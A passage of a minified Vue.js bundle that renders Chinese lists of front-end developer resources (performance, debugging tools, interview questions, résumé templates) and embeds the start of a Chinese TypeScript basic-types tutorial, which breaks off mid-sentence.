2")])]),t("p",[t("a",{attrs:{href:"http://jayli.github.io/blog/data/2011/12/23/yuislide.html",target:"_blank"}},[n._v("YUISlide,针对移动设备的动画性能优化")])]),t("p",[t("a",{attrs:{href:"http://joelglovier.com/improving-site-performance",target:"_blank"}},[n._v("Improving Site Performance")])]),t("p",[t("a",{attrs:{href:"http://segmentfault.com/a/1190000000367899",target:"_blank"}},[n._v("让网站提速的最佳前端实践")])]),t("p",[t("a",{attrs:{href:"http://sixrevisions.com/web-development/why-website-speed-is-important",target:"_blank"}},[n._v("Why Website\n                    Speed is Important")])]),t("p",[t("a",{attrs:{href:"https://www.devbridge.com/articles/need-for-speed-how-to-improve-your-website-performance",target:"_blank"}},[n._v("Need for Speed – How to Improve your Website Performance")])]),t("p",[t("a",{attrs:{href:"https://github.com/amfe/article/issues/1",target:"_blank"}},[n._v("阿里无线前端性能优化指南 (Pt.1 加载期优化")])]),t("p",[n._v("优化工具")]),t("p",[n._v("优化工具 地址")]),t("p",[t("a",{attrs:{href:"http://www.html-js.com/article/3083",target:"_blank"}},[n._v("JavaScript 性能分析新工具 OneProfile")])]),t("p",[t("a",{attrs:{href:"http://www.html-js.com/article/3091",target:"_blank"}},[n._v("JavaScript 堆内存分析新工具 OneHeap")])]),t("p",[n._v("在线工具")]),t("p",[n._v("在线工具 地址")]),t("p",[t("a",{attrs:{href:"https://developers.google.com/speed/pagespeed/insights",target:"_blank"}},[n._v("google在线工具")])]),t("p",[t("a",{attrs:{href:"http://www.alibench.com",target:"_blank"}},[n._v("阿里测")])]),t("p",[t("a",{attrs:{href:"http://itest.aliyun.com",target:"_blank"}},[n._v("阿里-免费测试服务")])]),t("p",[t("a",{attrs:{href:"https://github.com/alibaba/f2etest",target:"_blank"}},[n._v("阿里-F2etest多浏览器兼容性测试解决方案")])]),t("p",[t("a",{attrs:{href:"http://jsperf.com",target:"_blank"}},[n._v("js性能测试")])]),t("p",[n._v("前端架构")]),t("p",[n._v("前端架构 地址")]),t("p",[t("a",{attrs:{href:"http://www.zhihu.com/topic/19612641",target:"_blank"}},[n._v("技术架构")])]),t("p",[t("a",{attrs:{href:"http://saito.im/note/The-Architecture-of-F2E",target:"_blank"}},[n._v("前端架构")])]),t("p",[t("a",{attrs:{href:"http://www.zhihu.com/question/24092572",target:"_blank"}},[n._v("如何成为前端架构师")])]),t("p",[t("a",{attrs:{href:"http://hikejun.com/sharing/2010webrebuild/?file=fe-infrastructure.html",target:"_blank"}},[n._v("关于前端架构-张克军")])]),t("p",[t("a",{attrs:{href:"http://www.zhihu.com/question/25583350",target:"_blank"}},[n._v("百度腾讯offer比较（腾讯游戏VS百度基础架构）")])]),t("p",[n._v("推荐作品")]),t("p",[n._v("推荐作品 地址")]),t("p",[t("a",{attrs:{href:"https://gist.github.com/wintercn",target:"_blank"}},[n._v("winter代码片段需要FQ")])]),t("p",[t("a",{attrs:{href:"http://www.fgm.cc/learn",target:"_blank"}},[n._v("fgm")])]),t("p",[t("a",{attrs:{href:"https://github.com/hongru/hongru.github.com",target:"_blank"}},[n._v("岑安作品集")])]),t("p",[t("a",{attrs:{href:"http://kmdjs.github.io",target:"_blank"}},[n._v("当耐特demo集合")])]),t("p",[t("a",{attrs:{href:"http://www.laoshu133.com/Lab",target:"_blank"}},[n._v("米空格 js作品")])]),t("p",[t("a",{attrs:{href:"http://koen301.github.io",target:"_blank"}},[n._v("myFocus")])]),t("p",[t("a",{attrs:{href:"http://panxuepeng.github.io/seajslib",target:"_blank"}},[n._v("SeaJS组件库")])]),t("p",[t("a",{attrs:{href:"http://yanhaijing.com/myProject",target:"_blank"}},[n._v("颜海镜作品")])]),t("p",[t("a",{attrs:{href:"http://jo2.org/category/myworks",target:"_blank"}},[n._v("脚儿网作品")])]),t("p",[t("a",{attrs:{href:"http://www.cnitblog.com/yemoo/category/3107.html",target:"_blank"}},[n._v("javascript个人作品")])]),t("p",[t("a",{attrs:{href:"http://bbs.miaov.com/forum.php?mod=viewthread&tid=7790",target:"_blank"}},[n._v("妙味的雷东升游戏作品")])]),t("p",[t("a",{attrs:{href:"http://bbs.csdn.net/topics/380227212",target:"_blank"}},[n._v("javascript作品集")])]),t("p",[t("a",{attrs:{href:"https://github.com/TooBug/works",target:"_blank"}},[n._v("云五笔，灰度产生生成工具")])]),t("p",[t("a",{attrs:{href:"http://koen301.github.io",target:"_blank"}},[n._v("项目主页")])]),t("p",[t("a",{attrs:{href:"http://zaole.net",target:"_blank"}},[n._v("个性的作品主页")])]),t("p",[t("a",{attrs:{href:"http://static.tingall.com/v2/player",target:"_blank"}},[n._v("播放器")])]),t("p",[t("a",{attrs:{href:"http://ucren.com/blog/demos",target:"_blank"}},[n._v("ucren js demos 集")])]),t("p",[t("a",{attrs:{href:"http://www.zhinengshe.com/works_list.html",target:"_blank"}},[n._v("智能社")])]),t("p",[t("a",{attrs:{href:"http://demos.shizuwu.cn",target:"_blank"}},[n._v("实例陈列架")])]),t("p",[t("a",{attrs:{href:"http://zoye.sinaapp.com/demo",target:"_blank"}},[n._v("zoye demo")])]),t("p",[t("a",{attrs:{href:"http://lab.yuanwai.wang",target:"_blank"}},[n._v("王员外")])]),t("p",[t("a",{attrs:{href:"http://pingfan1990.sinaapp.com",target:"_blank"}},[n._v("平凡")])]),t("p",[t("a",{attrs:{href:"http://www.lovewebgames.com",target:"_blank"}},[n._v("jyg 游戏案例")])]),t("p",[t("a",{attrs:{href:"http://www.helloweba.com/list.html",target:"_blank"}},[n._v("很多jquery插件")])]),t("p",[t("a",{attrs:{href:"http://www.bujichong.com/sojs/api/index.html",target:"_blank"}},[n._v("不羁虫 - soJs 作品系列")])]),t("p",[t("a",{attrs:{href:"http://frozenui.github.io/case.html",target:"_blank"}},[n._v("frozenui")])]),t("p",[t("a",{attrs:{href:"http://js-game.github.io/othello",target:"_blank"}},[n._v("黑白棋")])]),t("p",[t("a",{attrs:{href:"http://yansm.github.io/fromone/index.html",target:"_blank"}},[n._v("fromone")])]),t("p",[t("a",{attrs:{href:"http://pazguille.me",target:"_blank"}},[n._v("pazguille")])]),t("p",[t("a",{attrs:{href:"https://github.com/zmmbreeze/DeadSimpleVideoPlayer",target:"_blank"}},[n._v("Html5 VideoPlayer")])]),t("p",[t("a",{attrs:{href:"http://a-jie.github.io/Proton/#example",target:"_blank"}},[n._v("Proton 烟花")])]),t("p",[n._v("简历模板")]),t("p",[n._v("简历模板 地址")]),t("p",[t("a",{attrs:{href:"http://learnshare.github.io/about/index.html",target:"_blank"}},[n._v("不错的个人简历")])]),t("p",[t("a",{attrs:{href:"http://hcy2367.github.io/resume",target:"_blank"}},[n._v("简历")])]),t("p",[t("a",{attrs:{href:"http://ncuey.sinaapp.com/CrispElite/",target:"_blank"}},[n._v("张伦")])]),t("p",[t("a",{attrs:{href:"https://github.com/hacke2/ResumeSample",target:"_blank"}},[n._v("简历")])]),t("p",[t("a",{attrs:{href:"http://blog.dandyweng.com/2013/07/how-my-website-was-created",target:"_blank"}},[n._v("翁天信")])]),t("p",[t("a",{attrs:{href:"http://www.webhek.com/misc/interactive-resume",target:"_blank"}},[n._v("动画方式的简历")])]),t("p",[t("a",{attrs:{href:"http://www.linqing07.com/resume.html",target:"_blank"}},[n._v("组件丰富简历")])]),t("p",[t("a",{attrs:{href:"http://www.mojianli.com/resume/view",target:"_blank"}},[n._v("简历池")])]),t("p",[t("a",{attrs:{href:"http://www.haorooms.com/about",target:"_blank"}},[n._v("haorooms博客")])]),t("p",[t("a",{attrs:{href:"http://cv.youngdze.com",target:"_blank"}},[n._v("Justin Young")])]),t("p",[n._v("面试题")]),t("p",[n._v("面试题 地址")]),t("p",[t("a",{attrs:{href:"http://www.nowcoder.com/discuss/3196",target:"_blank"}},[n._v("那几个月在找工作（百度，网易游戏）")])]),t("p",[t("a",{attrs:{href:"http://www.html-js.com/article/1743",target:"_blank"}},[n._v("2014最新面试题")])]),t("p",[t("a",{attrs:{href:"http://www.w3cfuns.com/thread-5598563-2-1.html",target:"_blank"}},[n._v("阿里前端面试题")])]),t("p",[t("a",{attrs:{href:"http://www.cnblogs.com/imwtr/p/4685546.html",target:"_blank"}},[n._v("2016校招内推 -- 阿里巴巴前端 -- 三面面试经历")])]),t("p",[t("a",{attrs:{href:"http://www.w3cfuns.com/article-5599657-1-1.html",target:"_blank"}},[n._v("腾讯面试题")])]),t("p",[t("a",{attrs:{href:"http://www.cnblogs.com/lvdabao/p/3660707.html",target:"_blank"}},[n._v("年后跳槽那点事：乐视+金山+360面试之行")])]),t("p",[t("a",{attrs:{href:"http://fatesinger.com/2722.html",target:"_blank"}},[n._v("阿里前端面试题上线")])]),t("p",[t("a",{attrs:{href:"http://www.cnblogs.com/52cik/p/js-question-lg.html",target:"_blank"}},[n._v("拉勾网js面试题")])]),t("p",[t("a",{attrs:{href:"http://www.cnblogs.com/allenxing/p/3724382.html",target:"_blank"}},[n._v("前端面试")])]),t("p",[t("a",{attrs:{href:"http://mianshiti.diandian.com",target:"_blank"}},[n._v("Web开发笔试面试题 大全")])]),t("p",[t("a",{attrs:{href:"http://segmentfault.com/a/1190000000465431",target:"_blank"}},[n._v("前端开发面试题")])]),t("p",[t("a",{attrs:{href:"https://github.com/markyun/My-blog/tree/master/Front-end-Developer-Questions",target:"_blank"}},[n._v("2014最新前端面试题")])]),t("p",[t("a",{attrs:{href:"https://github.com/fex-team/interview-questions",target:"_blank"}},[n._v("百度面试")])]),t("p",[t("a",{attrs:{href:"http://www.w3cfuns.com/forum.php?mod=forumdisplay&fid=51&filter=typeid&typeid=177",target:"_blank"}},[n._v("面试题")])]),t("p",[t("a",{attrs:{href:"https://github.com/darcyclarke/Front-end-Developer-Interview-Questions/tree/master/Chinese",target:"_blank"}},[n._v("前端工作面试问题")])]),t("p",[t("a",{attrs:{href:"http://segmentfault.com/a/1190000000465431",target:"_blank"}},[n._v("前端开发面试题")])]),t("p",[n._v("5个经典的前端面试问题 5个经典的前端面试问题")]),t("p",[t("a",{attrs:{href:"http://segmentfault.com/a/1190000002562454",target:"_blank"}},[n._v("最全前端面试问题及答案总结")])]),t("p",[t("a",{attrs:{href:"http://www.html-js.com/article/Large-search-front-team-column%202961",target:"_blank"}},[n._v("如何面试一名前端开发工程师？")])]),t("p",[t("a",{attrs:{href:"https://github.com/hawx1993/Front-end-Interview-questions",target:"_blank"}},[n._v("史上最全 前端开发面试问题及答案整理")])]),t("p",[t("a",{attrs:{href:"http://www.cnblogs.com/xiaoruo/p/4665163.html",target:"_blank"}},[n._v("前端实习生面试总结")])]),t("p",[t("a",{attrs:{href:"https://github.com/hawx1993/Front-end-Interview-questions",target:"_blank"}},[n._v("史上最全 前端开发面试问题及答案整理")])]),t("p",[t("a",{attrs:{href:"http://blog.jobbole.com/78738",target:"_blank"}},[n._v("BAT及各大互联网公司2014前端笔试面试题：JavaScript篇")])]),t("p",[t("a",{attrs:{href:"https://github.com/paddingme/Front-end-Web-Development-Interview-Question",target:"_blank"}},[n._v("前端开发面试题大收集")])]),t("p",[t("a",{attrs:{href:"https://github.com/qiu-deqing/FE-interview",target:"_blank"}},[n._v("收集的前端面试题和答案")])]),t("p",[t("a",{attrs:{href:"http://www.zhihu.com/question/19568008",target:"_blank"}},[n._v("如何面试前端工程师")])]),t("p",[t("a",{attrs:{href:"https://github.com/markyun/My-blog/blob/master/Front-end-Developer-Questions/Questions-and-Answers/README.md",target:"_blank"}},[n._v("前端开发面试题")])]),t("p",[t("a",{attrs:{href:"http://www.nowcoder.com/discuss?type=2",target:"_blank"}},[n._v("牛客网-笔试面经")])]),t("p",[n._v("iconfont")]),t("p",[n._v("iconfont 地址")]),t("p",[t("a",{attrs:{href:"http://www.zhihu.com/question/21253343",target:"_blank"}},[n._v("中文字体")])]),t("p",[t("a",{attrs:{href:"http://iconfont.cn",target:"_blank"}},[n._v("淘宝字库")])]),t("p",[t("a",{attrs:{href:"http://mux.alimama.com/fonts",target:"_blank"}},[n._v("字体")])]),t("p",[t("a",{attrs:{href:"http://iconfont.cn/help/platform.html",target:"_blank"}},[n._v("制作教程")])]),t("p",[t("a",{attrs:{href:"http://www.zhangxinxu.com/wordpress/?s=icomoon",target:"_blank"}},[n._v("zhangxinxu-icommon")])]),t("p",[t("a",{attrs:{href:"https://icomoon.io/app",target:"_blank"}},[n._v("icommon")])]),t("p",[t("a",{attrs:{href:"http://imooc.com/learn/243",target:"_blank"}},[n._v("用字体在网页中画ICON图标(推荐教程")])]),t("p",[t("a",{attrs:{href:"http://font-spider.org",target:"_blank"}},[n._v("字体压缩工具")])]),t("p",[n._v("Fiddler")]),t("p",[n._v("Fiddler 地址")]),t("p",[t("a",{attrs:{href:"http://www.cnblogs.com/tugenhua0707/p/4623317.html",target:"_blank"}},[n._v("Fiddler调式使用知多少(一深入研究")])]),t("p",[t("a",{attrs:{href:"http://www.cnblogs.com/strick/p/4570006.html",target:"_blank"}},[n._v("微信fiddle")])]),t("p",[t("a",{attrs:{href:"http://gaoboy.com/article/26.html",target:"_blank"}},[n._v("微信fiddle")])]),t("p",[n._v("Chrome")]),t("p",[n._v("Chrome 地址")]),t("p",[t("a",{attrs:{href:"https://developer.chrome.com/devtools",target:"_blank"}},[n._v("Google Chrome 官方")])]),t("p",[t("a",{attrs:{href:"http://www.cnblogs.com/constantince/p/4565261.html",target:"_blank"}},[n._v("Chrome - 基础")])]),t("p",[t("a",{attrs:{href:"http://www.cnblogs.com/constantince/p/4579121.html",target:"_blank"}},[n._v("Chrome - 进阶")])]),t("p",[t("a",{attrs:{href:"http://www.cnblogs.com/constantince/p/4585983.html",target:"_blank"}},[n._v("Chrome - 性能")])]),t("p",[t("a",{attrs:{href:"http://www.cnblogs.com/constantince/p/4607497.html",target:"_blank"}},[n._v("Chrome - 性能进阶")])]),t("p",[t("a",{attrs:{href:"http://www.cnblogs.com/constantince/p/4624241.html",target:"_blank"}},[n._v("Chrome - 移动")])]),t("p",[t("a",{attrs:{href:"http://www.cnblogs.com/liyunhua/p/4544738.html",target:"_blank"}},[n._v("Chrome - 使用技巧")])]),t("p",[t("a",{attrs:{href:"http://www.cnblogs.com/Wayou/p/chrome-console-tips-and-tricks.html",target:"_blank"}},[n._v("Chrome -\n                    Console控制台不完全指南")])]),t("p",[t("a",{attrs:{href:"http://c7sky.com/chrome-devtools-workspace.html",target:"_blank"}},[n._v("Chrome - Workspace使浏览器变成IDE")])]),t("p",[t("a",{attrs:{href:"http://www.html-js.com/article/Nothing-blind%202975",target:"_blank"}},[n._v("network面板")])]),t("p",[t("a",{attrs:{href:"http://anti-code.com/devtools-cheatsheet",target:"_blank"}},[n._v("chrome开发工具快捷键")])]),t("p",[t("a",{attrs:{href:"http://www.html-js.com/article/2327",target:"_blank"}},[n._v("chrome调试工具常用功能整理")])]),t("p",[t("a",{attrs:{href:"http://www.iinterest.net/2014/05/09/chrome-dev-tool-workspace",target:"_blank"}},[n._v("Chrome 开发工具 Workspace\n                    使用")])]),t("p",[t("a",{attrs:{href:"http://www.cppblog.com/deercoder/archive/2011/10/22/158886.html",target:"_blank"}},[n._v("Chrome神器Vimium快捷键学习记录")])]),t("p",[t("a",{attrs:{href:"http://www.w3cplus.com/sassguide/debug.html",target:"_blank"}},[n._v("sass调试-w3cplus")])]),t("p",[t("a",{attrs:{href:"http://www.w3cplus.com/tools/how-to-use-chrome-devtools-like-a-pro.html",target:"_blank"}},[n._v("如何更专业的使用Chrome开发者工具-w3cplus")])]),t("p",[t("a",{attrs:{href:"http://sentsin.com/web/253.html",target:"_blank"}},[n._v("chrome调试canvas")])]),t("p",[t("a",{attrs:{href:"https://developer.chrome.com/devtools/index",target:"_blank"}},[n._v("chrome profiles1")])]),t("p",[t("a",{attrs:{href:"http://h5dev.uc.cn/article-25-1.html",target:"_blank"}},[n._v("chrome profiles2")])]),t("p",[t("a",{attrs:{href:"http://www.oschina.net/translate/performance-optimisation-with-timeline-profiles",target:"_blank"}},[n._v("chrome profiles3")])]),t("p",[t("a",{attrs:{href:"https://developer.chrome.com/devtools/docs/mobile-emulation",target:"_blank"}},[n._v("chrome移动版调试")])]),t("p",[t("a",{attrs:{href:"http://ued.taobao.org/blog/2012/06/debug-with-chrome-dev-tool",target:"_blank"}},[n._v("chrome调试")])]),t("p",[t("a",{attrs:{href:"http://www.cnblogs.com/QLeelulu/archive/2011/08/28/2156402.html",target:"_blank"}},[n._v("chrome的调试")])]),t("p",[t("a",{attrs:{href:"https://developer.chrome.com/devtools/docs/commandline-api",target:"_blank"}},[n._v("chrome console 命令详解")])]),t("p",[t("a",{attrs:{href:"http://www.cnblogs.com/leonkao/p/3809655.html",target:"_blank"}},[n._v("查看事件绑定1")])]),t("p",[t("a",{attrs:{href:"http://www.cnblogs.com/xiaoyao2011/p/3447421.html",target:"_blank"}},[n._v("查看事件绑定2")])]),t("p",[t("a",{attrs:{href:"http://segmentfault.com/a/1190000000683599",target:"_blank"}},[n._v("神器——Chrome开发者工具(一")])]),t("p",[t("a",{attrs:{href:"https://xinranliu.me/2015-05-22-qiqu-performance",target:"_blank"}},[n._v("奇趣百科性能优化(Chrome DevTools 中的\n                    Timeline Profils 等工具使用介绍")])]),t("p",[t("a",{attrs:{href:"http://frontenddev.org/link/15-tips-of-chrome-developer-tools.html",target:"_blank"}},[n._v("chrome 开发者工具的 15\n                    个小技巧")])]),t("p",[t("a",{attrs:{href:"http://1ke.co/course/361",target:"_blank"}},[n._v("Chrome开发者工具不完全指南")])]),t("p",[t("a",{attrs:{href:"http://segmentfault.com/a/1190000003882567",target:"_blank"}},[n._v("Chrome 开发者工具使用技巧")])]),t("p",[n._v("Firebug")]),t("p",[n._v("Firebug 地址")]),t("p",[t("a",{attrs:{href:"http://www.imooc.com/learn/137",target:"_blank"}},[n._v("firebug视频教程")])]),t("p",[t("a",{attrs:{href:"https://developer.mozilla.org/zh-CN/docs/Tools/WebIDE",target:"_blank"}},[n._v("firefox 模拟器")])]),t("p",[t("a",{attrs:{href:"http://www.cnblogs.com/ctriphire/p/4116207.html",target:"_blank"}},[n._v("console.log 命令详解")])]),t("p",[t("a",{attrs:{href:"http://www.ruanyifeng.com/blog/2008/06/firebug_tutorial.html",target:"_blank"}},[n._v("Firebug入门指南")])]),t("p",[t("a",{attrs:{href:"http://www.ruanyifeng.com/blog/2011/03/firebug_console_tutorial.html",target:"_blank"}},[n._v("Firebug控制台详解")])]),t("p",[n._v("移动,微信调试")]),t("p",[n._v("移动,微信调试 地址")]),t("p",[t("a",{attrs:{href:"https://openstf.github.io",target:"_blank"}},[n._v("浏览器端调试安卓")])]),t("p",[t("a",{attrs:{href:"http://yujiangshui.com/multidevice-frontend-debug",target:"_blank"}},[n._v("移动端前端开发调试")])]),t("p",[t("a",{attrs:{href:"https://github.com/yujiangshui/CN-Chrome-DevTools/blob/remote-debugging/md/Use-Tools/remote-debugging.md",target:"_blank"}},[n._v("使用 Chrome 远程调试 Android 设备")])]),t("p",[t("a",{attrs:{href:"http://plus.uc.cn/document/webapp/doc5.html",target:"_blank"}},[n._v("mac移动端调试")])]),t("p",[t("a",{attrs:{href:"http://www.mihtool.com",target:"_blank"}},[n._v("mac移动端调试")])]),t("p",[t("a",{attrs:{href:"http://thx.github.io/mobile/debugging-in-mobile",target:"_blank"}},[n._v("无线调试攻略")])]),t("p",[t("a",{attrs:{href:"http://yanhaijing.com/mobile/2014/12/17/web-debug-for-mobile",target:"_blank"}},[n._v("无线调试攻略")])]),t("p",[t("a",{attrs:{href:"http://www.jianshu.com/p/ccf124f1f74b",target:"_blank"}},[n._v("屌爆了,完美调试 微信webview(x5")])]),t("p",[n._v("微信调试的那些事 微信调试的那些事")]),t("p",[t("a",{attrs:{href:"http://jsconsole.com",target:"_blank"}},[n._v("远程console")])]),t("p",[t("a",{attrs:{href:"http://blog.qqbrowser.cc",target:"_blank"}},[n._v("微信调试工具")])]),t("p",[t("a",{attrs:{href:"https://github.com/jieyou/remote_inspect_web_on_real_device",target:"_blank"}},[n._v("各种真机远程调试方法汇总")])]),t("p",[n._v("iOS Simulator")]),t("p",[n._v("iOS Simulator 地址")]),t("p",[n._v("Simulator iOS_Simulator_Guide-Introduction")]),t("p",[t("a",{attrs:{href:"http://www.crifan.com/intro_ios_simulator_in_xcode_and_usage_summary",target:"_blank"}},[n._v("iOS\n                    Simulator的介绍和使用心得")])]),t("p",[n._v("img")]),t("p",[n._v("img 地址")]),t("p",[t("a",{attrs:{href:"http://preloaders.net/en/circular",target:"_blank"}},[n._v("loading img")])]),t("p",[t("a",{attrs:{href:"http://zhitu.isux.us",target:"_blank"}},[n._v("智图-图片优化平台")])]),t("p",[t("a",{attrs:{href:"https://tinypng.com",target:"_blank"}},[n._v("在线png优化")])]),t("p",[n._v("生成二维码")]),t("p",[n._v("生成二维码 地址")]),t("p",[t("a",{attrs:{href:"http://cli.im",target:"_blank"}},[n._v("生成二维码")])]),t("p",[n._v("浏览器同步")]),t("p",[n._v("浏览器同步 地址")]),t("p",[t("a",{attrs:{href:"https://github.com/leeluolee/puer",target:"_blank"}},[n._v("puer")])]),t("p",[t("a",{attrs:{href:"http://livereload.com",target:"_blank"}},[n._v("liveReload")])]),t("p",[t("a",{attrs:{href:"http://getf5.com",target:"_blank"}},[n._v("f5")])]),t("p",[t("a",{attrs:{href:"http://geek100.com/2608",target:"_blank"}},[n._v("File Watchers")])]),t("p",[n._v("在线PPT制作")]),t("p",[n._v("在线PPT制作 地址")]),t("p",[n._v("nodePPT nodePPT")]),t("p",[t("a",{attrs:{href:"http://www.jeffjade.com/2015/10/15/2015-10-16-cleaver-make-ppt/",target:"_blank"}},[n._v("Cleaver快速制作网页PPT")])]),t("p",[t("a",{attrs:{href:"http://www.cnblogs.com/Darren_code/archive/2013/01/04/impressjs.html",target:"_blank"}},[n._v("impress.js")])]),t("p",[t("a",{attrs:{href:"https://github.com/ksky521/nodePPT",target:"_blank"}},[n._v("PPT")])]),t("p",[t("a",{attrs:{href:"https://github.com/hakimel/reveal.js",target:"_blank"}},[n._v("reveal")])]),t("p",[t("a",{attrs:{href:"https://github.com/Seldaek/slippy",target:"_blank"}},[n._v("slippy")])]),t("p",[n._v("前端导航网站")]),t("p",[n._v("前端导航网站 地址")]),t("p",[t("a",{attrs:{href:"http://uxbees.com/index.html",target:"_blank"}},[n._v("界面清爽的前端导航")])]),t("p",[t("a",{attrs:{href:"http://whycss.com",target:"_blank"}},[n._v("前端导航")])]),t("p",[t("a",{attrs:{href:"http://www.daqianduan.com/nav",target:"_blank"}},[n._v("前端网址导航")])]),t("p",[t("a",{attrs:{href:"http://sentsin.com/daohang",target:"_blank"}},[n._v("前端名录")])]),t("p",[t("a",{attrs:{href:"http://123.jser.us",target:"_blank"}},[n._v("前端导航")])]),t("p",[t("a",{attrs:{href:"http://www.css88.com/nav",target:"_blank"}},[n._v("前端开发资源")])]),t("p",[t("a",{attrs:{href:"http://www.haourl.cn",target:"_blank"}},[n._v("网址导航")])]),t("p",[t("a",{attrs:{href:"http://code.ciaoca.com",target:"_blank"}},[n._v("前端开发仓库 - 众多效果的收集地")])]),t("p",[t("a",{attrs:{href:"https://github.com/jnoodle/f2e-collect",target:"_blank"}},[n._v("前端资源导航")])]),t("p",[t("a",{attrs:{href:"http://f2e.im/static/pages/nav/index.html",target:"_blank"}},[n._v("F2E 前端导航")])]),t("p",[n._v("常用CDN")])])}],Go={},Vo=Go,Qo=(t("740a"),Object(u["a"])(Vo,Wo,$o,!1,null,"49488d6a",null)),Ko=Qo.exports,Xo={mixins:[xn["a"]],components:{m1:so,m2:mo,m3:fo,m4:ko,m5:Oo,m6:qo,m7:zo,m8:Ko},data:function(){return{tab:"m1",tab_level:2,tabs:[{label:"git",value:"m1"},{label:"webpack",value:"m2"},{label:"nginx",value:"m3"},{label:"基本",value:"m4"},{label:"基本",value:"m5"},{label:"基本",value:"m6"},{label:"基本",value:"m7"},{label:"基本",value:"m8"}]}}},Yo=Xo,Zo=Object(u["a"])(Yo,Ys,Zs,!1,null,"273ace22",null),nl=Zo.exports,rl=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",[t(""+n.tab,{tag:"component"})],1)},tl=[],el=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",{},[t("q-markdown",{attrs:{src:n.MainComponent1}}),t("q-markdown",{attrs:{src:n.MainComponent2}}),t("q-markdown",{attrs:{src:n.MainComponent3}}),t("q-markdown",{attrs:{src:n.MainComponent4}}),t("q-markdown",{attrs:{src:n.MainComponent5}}),t("q-markdown",{attrs:{src:n.MainComponent6}}),t("q-markdown",{attrs:{src:n.MainComponent7}})],1)},al=[],il='# 基础类型\n\n## 介绍\n\n为了让程序有价值，我们需要能够处理最简单的数据单元：数字，字符串，结构体，布尔值等。 TypeScript支持与JavaScript几乎相同的数据类型，此外还提供了实用的枚举类型方便我们使用。\n\n## Boolean\n\n最基本的数据类型就是简单的true/false值，在JavaScript和TypeScript里叫做`boolean`（其它语言中也一样）。\n\n```typescript\nlet isDone: boolean = false;\n```\n\n## Number\n\n和JavaScript一样，TypeScript里的所有数字都是浮点数或者大整数 。 这些浮点数的类型是`number`， 而大整数的类型则是 `bigint`。 除了支持十进制和十六进制字面量，TypeScript还支持ECMAScript 2015中引入的二进制和八进制字面量。\n\n```typescript\nlet decLiteral: number = 6;\nlet hexLiteral: number = 0xf00d;\nlet binaryLiteral: number = 0b1010;\nlet octalLiteral: number = 0o744;\nlet bigLiteral: bigint = 100n;\n```\n\n## String\n\nJavaScript程序的另一项基本操作是处理网页或服务器端的文本数据。 像其它语言里一样，我们使用`string`表示文本数据类型。 和JavaScript一样，可以使用双引号（`"`）或单引号（`\'`）表示字符串。\n\n```typescript\nlet name: string = "bob";\nname = "smith";\n```\n\n你还可以使用_模版字符串_，它可以定义多行文本和内嵌表达式。 这种字符串是被反引号包围（````` ），并且以`${ expr }`这种形式嵌入表达式\n\n```typescript\nlet name: string = `Gene`;\nlet age: number = 37;\nlet sentence: string = `Hello, my name is ${ name }.\n\nI\'ll be ${ age + 1 } years old next month.`;\n```\n\n这与下面定义`sentence`的方式效果相同：\n\n```typescript\nlet sentence: string = "Hello, my name is " + name + ".\\n\\n" +\n    "I\'ll be " + (age + 1) + " years old next month.";\n```\n\n## Array\n\nTypeScript像JavaScript一样可以操作数组元素。 有两种方式可以定义数组。 第一种，可以在元素类型后面接上`[]`，表示由此类型元素组成的一个数组：\n\n```typescript\nlet list: number[] = [1, 2, 3];\n```\n\n第二种方式是使用数组泛型，`Array<元素类型>`：\n\n```typescript\nlet list: Array<number> = [1, 2, 3];\n```\n\n## Tuple\n\n元组类型允许表示一个已知元素数量和类型的数组，各元素的类型不必相同。比如，你可以定义一对值分别为`string`和`number`类型的元组。\n\n```typescript\n// Declare a tuple type\nlet x: [string, number];\n// Initialize it\nx = [\'hello\', 10]; // OK\n// Initialize it incorrectly\nx = [10, \'hello\']; // Error\n```\n\n当访问一个已知索引的元素，会得到正确的类型：\n\n```typescript\nconsole.log(x[0].substr(1)); // OK\nconsole.log(x[1].substr(1)); // Error, \'number\' does not have \'substr\'\n```\n\n当访问一个越界的元素会报错。\n\n```typescript\nx[3] = "world"; // Error, Property \'3\' does not exist on type \'[string, number]\'.\n\nconsole.log(x[5].toString()); // Error, Property \'5\' does not exist on type \'[string, number]\'.\n```\n\n## Enum\n\n`enum`类型是对JavaScript标准数据类型的一个补充。 像C\\#等其它语言一样，使用枚举类型可以为一组数值赋予友好的名字。\n\n```typescript\nenum Color {Red, Green, Blue}\nlet c: Color = Color.Green;\n```\n\n默认情况下，从`0`开始为元素编号。 你也可以手动的指定成员的数值。 例如，我们将上面的例子改成从`1`开始编号：\n\n```typescript\nenum Color {Red = 1, Green, Blue}\nlet c: Color = Color.Green;\n```\n\n或者，全部都采用手动赋值：\n\n```typescript\nenum Color {Red = 1, Green = 2, Blue = 4}\nlet c: Color = Color.Green;\n```\n\n枚举类型提供的一个便利是你可以由枚举的值得到它的名字。 例如，我们知道数值为2，但是不确定它映射到Color里的哪个名字，我们可以查找相应的名字：\n\n```typescript\nenum Color {Red = 1, Green, Blue}\nlet colorName: string = Color[2];\n\nconsole.log(colorName);  // 显示\'Green\'因为上面代码里它的值是2\n```\n\n## Unknown\n\n当我们在写应用的时候可能会需要描述一个我们还不知道其类型的变量。这些值可以来自动态内容，例如从用户获得，或者我们想在我们的 API 中接收所有可能类型的值。在这些情况下，我们想要让编译器以及未来的用户知道这个变量可以是任意类型。这个时候我们会对它使用 `unknown` 类型。\n\n```typescript\nlet notSure: unknown = 4;\nnotSure = "maybe a string instead";\n\n// OK, definitely a boolean\nnotSure = false;\n```\n\n如果你有一个 `unknwon` 类型的变量，你可以通过进行 `typeof` 、比较或者更高级的类型检查来将其的类型范围缩小，这些方法会在后续章节中进一步讨论：\n\n```typescript\n// @errors: 2322 2322 2322\ndeclare const maybe: unknown;\n// \'maybe\' could be a string, object, boolean, undefined, or other types\nconst aNumber: number = maybe;\n\nif (maybe === true) {\n  // TypeScript knows that maybe is a boolean now\n  const aBoolean: boolean = maybe;\n  // So, it cannot be a string\n  const aString: string = maybe;\n}\n\nif (typeof maybe === "string") {\n  // TypeScript knows that maybe is a string\n  const aString: string = maybe;\n  // So, it cannot be a boolean\n  const aBoolean: boolean = maybe;\n}\n```\n\n## Any\n\n有时候，我们会想要为那些在编程阶段还不清楚类型的变量指定一个类型。 这些值可能来自于动态的内容，比如来自用户输入或第三方代码库。 这种情况下，我们不希望类型检查器对这些值进行检查而是直接让它们通过编译阶段的检查。 那么我们可以使用`any`类型来标记这些变量：\n\n```typescript\nlet notSure: any = 4;\nnotSure = "maybe a string instead";\nnotSure = false; // okay, definitely a 